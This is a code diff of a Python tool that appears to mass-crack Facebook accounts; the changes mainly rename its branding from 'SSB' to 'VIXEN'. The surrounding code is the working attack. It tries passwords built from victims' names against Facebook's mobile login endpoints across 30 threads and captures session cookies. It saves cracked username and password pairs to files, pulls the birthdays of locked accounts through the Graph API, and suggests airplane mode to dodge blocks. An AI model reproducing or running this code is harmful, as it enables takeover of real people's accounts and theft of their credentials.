@@ -19,7 +19,7 @@ except ImportError:
     os.system('pip install bs4')
 
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
-from concurrent.futures import ThreadPoolExecutor as sarfrazssb
+from concurrent.futures import ThreadPoolExecutor as sarfrazVIXEN
 from datetime import datetime
 from bs4 import BeautifulSoup
 
@@ -72,28 +72,25 @@ def jalan(z):
         time.sleep(0.01)
 
 logo =                                          """   
- __      ___                  _  _   _  _   _  _   
- \ \    / (_)                | || | | || | | || |  
-  \ \  / / ___  _____ _ __   | || |_| || |_| || |_ 
-   \ \/ / | \ \/ / _ \ '_ \  |__   _|__   _|__   _|
-    \  /  | |>  <  __/ | | |    | |    | |    | |  
-     \/   |_/_/\_\___|_| |_|    |_|    |_|    |_|  
-                                                   
-                                                   
+██    ██ ██ ██   ██ ███████ ███    ██ 
+██    ██ ██  ██ ██  ██      ████   ██ 
+██    ██ ██   ███   █████   ██ ██  ██ 
+ ██  ██  ██  ██ ██  ██      ██  ██ ██ 
+  ████   ██ ██   ██ ███████ ██   ████ 
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           ᴠɪxᴇɴ 4 4 4
-\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          タナンロシャン
-\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           ʀᴏsʜᴀɴ-ᴅᴏɴᴀ
-\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             0.1.1
+\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           vixen 444
+\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m       Roshan Tamang
+\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           RoshanDona
+\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m           4.2.8
 \033[1;37m------------------------\033[1;37m------------------------ """                                              
 
 def hasil(OK,cp):
 	if not len(OK) != 0:
 	    pass
 	if len(cp) != 0:
-	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSSB_OK.txt' % (H, P, str(len(ok))))
-	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
-	    input("\x1b[1;97mPress enter to back SSB Menu ")
+	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mVIXEN_OK.txt' % (H, P, str(len(ok))))
+	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mVIXEN_CP.txt' % (H, P, str(len(cp))))
+	    input("\x1b[1;97mPress enter to back VIXEN Menu ")
 	    sarfraz()
 
 def sarfraz():
@@ -104,7 +101,7 @@ def sarfraz():
     IP = ipm['origin']
     print
     print(' [1] Start File Cloning')
-    print(' [2] Create File [Best-Method]')
+    print(' [2] Create File')
     print(' [E] exit ')
     print('')
     _sarfraz___ = input(' [?] Choose option : ')
@@ -135,7 +132,7 @@ class __xxx__:
             self.sarfrazx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r \x1b[1;97m[SSB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
+        sys.stdout.write(f"\r \x1b[1;97m[VIXEN] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -185,10 +182,10 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H} [SSB-OK] {user} | {pw}")
+                    print(f"\r{H} [VIXEN-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('SSB_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('VIXEN_OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -197,10 +194,10 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s [VIXEN-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('VIXEN_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -208,10 +205,10 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s [VIXEN-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('VIXEN_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
@@ -239,7 +236,7 @@ class __xxx__:
             print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with sarfrazssb(max_workers=30) as ssbworld:
+            with sarfrazVIXEN(max_workers=30) as VIXENworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -254,7 +251,7 @@ class __xxx__:
                         else:
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        VIXENworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -262,10 +259,11 @@ class __xxx__:
             os.system("clear")
             print(logo)
             print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
-            p1 = input('  Name + 1 : ')
-            p2 = input('  Name + 2 : ')
-            p3 = input('  Name + 3 : ')
-            p4 = input('  Name + 4 : ')
+            p1 = input('  Name + @1 : ')
+            p2 = input('  Name + 1 : ')
+            p3 = input('  Name + 2 : ')
+            p4 = input('  Name + 3 : ')
+            p1 = input('  Name + 4 : ')
             os.system("clear")
             print(logo)
             print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
@@ -273,7 +271,7 @@ class __xxx__:
             print('\033[1;37m Total IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with sarfrazssb(max_workers=30) as ssbworld:
+            with sarfrazVIXEN(max_workers=30) as VIXENworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -282,7 +280,7 @@ class __xxx__:
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        VIXENworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
